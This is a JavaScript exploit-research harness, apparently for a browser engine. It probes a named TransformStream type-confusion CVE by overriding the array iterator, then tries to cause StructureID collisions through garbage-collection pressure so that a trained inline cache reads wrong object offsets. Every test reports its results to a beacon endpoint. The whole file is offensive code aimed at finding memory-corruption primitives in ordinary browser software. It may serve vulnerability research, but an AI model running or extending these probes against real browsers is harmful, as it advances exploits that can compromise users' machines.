/*
 * p428 -- CVE-2026-43705 TransformStream type confusion variants
 *        + StructureID GC collision for LLInt IC type confusion
 *
 * TransformStream: iterator override substitutes unexpected types.
 * Three variants from public disclosure.
 *
 * StructureID: Direct pointer decode (mask+heapBase), no validation.
 * Create structures, GC them, create new ones at same address.
 *
 * Beacon prefix: V428-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V428-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// ================================================================
// Test A: TransformStream variant 1 - ArrayBuffer reference object
// ================================================================

function testA() {
  B("A-START");

  if (typeof TransformStream === "undefined") {
    B("A-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];

  // Variant 1: Return objects that look like streams but hold AB refs
  try {
    var ab = new ArrayBuffer(256);
    new Uint32Array(ab).fill(0xDEADBEEF);

    var callCount = 0;
    Array.prototype[Symbol.iterator] = function() {
      callCount++;
      var fakeWritable = {
        getWriter: function() {
          return {
            write: function(chunk) { return Promise.resolve(); },
            close: function() { return Promise.resolve(); },
            releaseLock: function() {},
            closed: Promise.resolve(),
            ready: Promise.resolve(),
            desiredSize: 1
          };
        },
        locked: false
      };

      var fakeReadable = {
        getReader: function() {
          return {
            read: function() { return Promise.resolve({done: true}); },
            releaseLock: function() {},
            closed: Promise.resolve(),
            cancel: function() { return Promise.resolve(); }
          };
        },
        locked: false,
        _buffer: ab  // smuggle AB reference
      };

      var items = [fakeReadable, {}, fakeWritable];
      var idx = 0;
      return {
        next: function() {
          if (idx < items.length) return {value: items[idx++], done: false};
          return {done: true};
        }
      };
    };

    var ts = new TransformStream();
    B("A-CREATED", {callCount: callCount, type: typeof ts});

    // Check if we can access internals
    if (ts.readable) {
      B("A-READABLE", typeof ts.readable);
      try {
        var reader = ts.readable.getReader();
        B("A-READER", typeof reader);
      } catch(e) {
        B("A-READER-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("A-ERR", e.message.slice(0, 80));
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test B: TransformStream variant 2 - fewer than 3 entries
// ================================================================

function testB() {
  B("B-START");

  if (typeof TransformStream === "undefined") {
    B("B-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];

  // Return only 1 or 2 items instead of expected 3
  var variants = [
    {name: "empty", items: []},
    {name: "one", items: [{}]},
    {name: "two", items: [{}, {}]},
    {name: "four", items: [{}, {}, {}, {}]},
    {name: "undef", items: [undefined, undefined, undefined]}
  ];

  variants.forEach(function(v) {
    try {
      Array.prototype[Symbol.iterator] = function() {
        var idx = 0;
        var items = v.items;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      };

      var ts = new TransformStream();
      B("B-" + v.name + "-OK", typeof ts);
    } catch(e) {
      B("B-" + v.name + "-ERR", e.message.slice(0, 60));
    }
  });

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test C: TransformStream variant 3 - type confusion via getters
// ================================================================

function testC() {
  B("C-START");

  if (typeof TransformStream === "undefined") {
    B("C-NO-TS");
    return;
  }

  var origIter = Array.prototype[Symbol.iterator];

  // Use getter properties that change type on second access
  try {
    var accessCount = 0;

    Array.prototype[Symbol.iterator] = function() {
      var fakeItems = [];

      // Build items with type-shifting getters
      var obj1 = {};
      Object.defineProperty(obj1, "writable", {
        get: function() {
          accessCount++;
          if (accessCount === 1) return null;
          // Second access returns a real-ish writable stream
          return new WritableStream();
        }
      });

      var obj2 = {};
      Object.defineProperty(obj2, "readable", {
        get: function() {
          accessCount++;
          if (accessCount <= 2) return null;
          return new ReadableStream();
        }
      });

      fakeItems = [obj2, {transform: function(){}}, obj1];
      var idx = 0;
      return {
        next: function() {
          if (idx < fakeItems.length) return {value: fakeItems[idx++], done: false};
          return {done: true};
        }
      };
    };

    var ts = new TransformStream();
    B("C-CREATED", {accessCount: accessCount});
  } catch(e) {
    B("C-ERR", {msg: e.message.slice(0, 80), accessCount: accessCount});
  } finally {
    Array.prototype[Symbol.iterator] = origIter;
  }
}

// ================================================================
// Test D: TransformStream - direct constructor with type-shifting args
// ================================================================

function testD() {
  B("D-START");

  if (typeof TransformStream === "undefined") {
    B("D-NO-TS");
    return;
  }

  // Try passing transformer with type-shifting start/transform/flush
  var startCalls = 0;
  var transformCalls = 0;

  try {
    var ts = new TransformStream({
      start: function(controller) {
        startCalls++;
        B("D-START-CB", {call: startCalls, ctrlType: typeof controller});

        // Try to access controller internals
        if (controller.enqueue) {
          // Enqueue a TypedArray to test type handling
          var ab = new ArrayBuffer(64);
          new Uint32Array(ab).fill(0xCAFEBABE);
          controller.enqueue(new Uint8Array(ab));
        }

        // Try to replace controller methods
        try {
          controller.enqueue = function(chunk) {
            B("D-FAKE-ENQUEUE", typeof chunk);
          };
        } catch(e) {}

        return undefined;
      },
      transform: function(chunk, controller) {
        transformCalls++;
        controller.enqueue(chunk);
      }
    });

    B("D-CREATED", {startCalls: startCalls});

    // Try to use the stream
    var writer = ts.writable.getWriter();
    var reader = ts.readable.getReader();

    writer.write(new Uint8Array([1,2,3,4]));
    reader.read().then(function(result) {
      B("D-READ", {
        done: result.done,
        valueType: result.value ? result.value.constructor.name : "null",
        len: result.value ? result.value.length || result.value.byteLength : 0
      });
    }).catch(function(e) {
      B("D-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B("D-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: StructureID GC collision - create, free, recreate
// ================================================================

function testE() {
  B("E-START");

  // Phase 1: Train IC with object layout A
  function readProp(obj) {
    return obj.x;
  }

  // Create objects with specific structure (layout A: {x, y})
  var trainObjs = [];
  for (var i = 0; i < 100; i++) {
    var o = {x: 0x41414141, y: 0x42424242};
    trainObjs.push(o);
    readProp(o); // warm IC
  }
  B("E-TRAINED", readProp(trainObjs[0]));

  // Phase 2: Release all training objects
  trainObjs = null;

  // Force GC aggressively
  var gcPressure = [];
  for (var g = 0; g < 100; g++) {
    gcPressure.push(new ArrayBuffer(256 * 1024));
  }
  gcPressure = null;

  // More GC pressure
  for (var g = 0; g < 50; g++) {
    var tmp = new ArrayBuffer(1024 * 1024);
    tmp = null;
  }

  B("E-GC-DONE");

  // Phase 3: Create objects with DIFFERENT layout at hopefully same addresses
  // Layout B: {a, b, c, x} -- x is at a different offset than in layout A
  var newObjs = [];
  for (var i = 0; i < 1000; i++) {
    var o = {a: 0xAAAAAAAA, b: 0xBBBBBBBB, c: 0xCCCCCCCC, x: 0xDDDDDDDD};
    newObjs.push(o);
  }

  // Phase 4: Read through IC trained on layout A
  // If StructureID collision occurred, IC reads wrong offset
  var confused = 0;
  var total = 0;
  for (var i = 0; i < newObjs.length; i++) {
    var val = readProp(newObjs[i]);
    total++;
    if (val !== 0xDDDDDDDD) {
      confused++;
      if (confused <= 5) {
        B("E-CONFUSED", {idx: i, val: val, expected: 0xDDDDDDDD});
      }
    }
  }

  B("E-RESULT", {total: total, confused: confused, allCorrect: confused === 0});
}

// ================================================================
// Test F: StructureID with WeakRef timing
// ================================================================

function testF() {
  B("F-START");

  if (typeof WeakRef === "undefined") {
    B("F-NO-WEAKREF");
    return;
  }

  // Create object, get WeakRef, let object die, check deref timing
  function readX(obj) { return obj.x; }

  var ref;
  (function() {
    var obj = {x: 0x11111111, y: 0x22222222};
    readPropF(obj); // train IC
    ref = new WeakRef(obj);
  })();

  function readPropF(obj) { return obj.x; }

  // GC pressure
  for (var i = 0; i < 100; i++) {
    var t = new ArrayBuffer(512 * 1024);
    t = null;
  }

  var derefResult = ref.deref();
  B("F-DEREF", {
    alive: derefResult !== undefined,
    val: derefResult ? derefResult.x : "collected"
  });

  // If alive, create many objects with different layout
  if (derefResult) {
    // Object still alive due to conservative GC
    // Try to force it to die by pushing it off the stack
    derefResult = null;
    var bloat = [];
    for (var i = 0; i < 200; i++) {
      bloat.push({z: i, w: "padding".repeat(100)});
    }
    bloat = null;

    for (var i = 0; i < 100; i++) {
      var t = new ArrayBuffer(1024 * 1024);
      t = null;
    }

    var deref2 = ref.deref();
    B("F-DEREF2", {
      alive: deref2 !== undefined,
      val: deref2 ? deref2.x : "collected"
    });
  }
}

testA();
testB();
testC();
testD();
testE();
testF();

setTimeout(function() { B("DONE"); }, 2000);
})();
